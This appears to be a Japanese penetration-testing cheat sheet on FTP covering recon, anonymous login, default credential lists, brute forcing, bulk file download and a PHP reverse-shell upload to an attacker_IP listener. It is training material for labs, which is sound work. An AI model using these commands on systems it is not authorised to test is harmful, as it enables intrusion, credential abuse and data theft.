w# FTPの基本

FTPはTCPベースのネットワークで、あるホストから別のホストへファイルを転送するための標準プロトコル。

- クライアント・サーバーモデルで動作
- 匿名アクセス（anonymous）と認証アクセスの2種類をサポート

## Active・Passiveモード

ログイン後、`passive`コマンドで切り替え可能。

| 項目         | Activeモード                                    | Passiveモード（推奨）                   |
| ---------- | -------------------------------------------- | -------------------------------- |
| 制御接続の開始者   | クライアント → サーバー（TCP/21）                        | クライアント → サーバー（TCP/21）            |
| データ接続の開始者  | サーバー → クライアント<br>(クライアントがサーバーに対し「私に接続して」と依頼) | クライアント → サーバー                    |
| 使用ポート（データ） | クライアント側：TCP/20（送信元）                          | サーバーが選んだ高番ランダムポート                |
| FWとの相性     | ❌ FTPサーバー(社外)→クライアント(社内)の接続は遮断されやすい          | ⭕️ クライアント(社内)から全接続を発信するので遮断されにくい |
- 参考記事🔗：[CentOSサーバー構築入門](http://cos.linux-dvr.biz/archives/131)

---

# 接続方法

標準のftpコマンド
```zsh
ftp <target_IP> [Port]
````
- ポート番号は省略可能（デフォルト21番）
- ドメイン指定可

lftpコマンド（拡張版）
```zsh
lftp <target_IP> -u <username> [-p <port>]
```
- ftpの拡張版で使いやすく、可視性も良いため、基本は==これを使う==（`ls -la`も可能なときがある）

Webブラウザ経由
```url
ftp://<username>:<pw>@<target_IP>
```

---

# Recon

NSEを使った包括的な列挙（情報量が多い）
```zsh
sudo nmap -p <Port> --script=ftp* -T4 <target_IP>
```

>[!TIP]
>`-sC`オプションでanonymousログインが可能かどうかを判断するため、Nmapの結果に"Anonymous FTP login allowed"となければ、わざわざanonymousログイン試行する必要はない。

バナーグラブ(Nmapで代替可)
```zsh
nc -nv <target_IP> 21
```
- 接続時の応答メッセージからサービスとバージョンを特定

デフォルト・一般的なディレクトリの列挙
```zsh
gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 100 -o gobuster_ftp.sh -u ftp://<target_IP>
```
- 機密情報が含まれる可能性のあるディレクトリを発見

---

# Exploit

## anonymous認証

```zsh
ftp <target_IP>
Name: anonymous
Password: <任意のパスワード>
```
- パスワードは何でも良いし空白可

## 一般的な認証情報の試行

anonymousログインが無効な場合、よくある認証情報を試す
```
Username: admin / administrator / root / ftpuser / test
Password: admin / password / root / 123456
```
- **ブルートフォースより先に試すべき**

## 認証情報のブルートフォース

方法A：[🐉THC-Hydra](../../Tools/🐉THC-Hydra.md#サービスに対する辞書攻撃)

方法B：Nmapスクリプトによるブルートフォース
```zsh
nmap -p 21 --script ftp-brute <target_IP>
```

---

# 侵入後の操作（Post-Exploitation）

全ファイルの**一括ダウンロード**
```zsh
wget -m --user='<username>' --password='<pw>' ftp://<target_IP>[:Port]
```
- `-m`：ミラーリングモード

## よく使うFTPコマンド一覧

| コマンド     | 説明                                     | 使用例                            |
| -------- | -------------------------------------- | ------------------------------ |
| `lcd`    | ローカルディレクトリ(Kali側)の変更                   | `lcd /path/to/directory`       |
| `cd`     | サーバーディレクトリの変更                          | `cd /path/to/directory`        |
| `ls`     | サーバーのファイル一覧表示                          | `ls`                           |
| `get`    | サーバーからファイルをダウンロード                      | `get filename.txt`             |
| `mget`   | 複数ファイルをダウンロード                          | `mget *.txt`                   |
| `put`    | サーバーへファイルをアップロード                       | `put filename.txt`             |
| `mput`   | 複数ファイルをアップロード                          | `mput *.txt`                   |
| `binary` | バイナリ転送モードに設定（**バイナリをアップロードするときに実行必須**） | `binary`<br>`put filename.exe` |
| `ascii`  | ASCII転送モードに設定                          | `ascii`                        |

## Webサイト経由のリバースシェル

FTPでアクセスできるディレクトリが、Webでもアクセス可能で、WebサーバーがPHPやASPを実行できる場合に有効。

1. ペイロードのダウンロード
```zsh
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
```

2. shell.phpの編集
```php
$ip = '<attacker_IP>';
$port = <Port>;
```

3. FTPサーバーにペイロードをアップロード
```zsh
ftp <target_IP>
```
```zsh
ftp> put shell.php
```
- ブラウザでアップロード先のURLにアクセスすると、リスナーへ接続が確立される
- FTPディレクトリへのWebパスを正確に特定する必要がある

---

# トラブルシューティング

- "29 Entering Extended Passive Mode (|||10092|) 150 Opening BINARY mode data connection for xxx (2590 bytes)."と出力されて止まる
	- →VPNのパケット制限がかかっている可能性があるため、`sudo ifconfig tun0 mtu 1200`としてからダウンロード
	- →FWで遮断されている可能性があるため、`passive on`としてからダウンロード

- lftpで接続後、`ls`とすると"Certificate verification: The certificate is NOT trusted. "と表示されてディレクトリが列挙できない
	- ログイン後、`set ssl:verify-certificate no`とする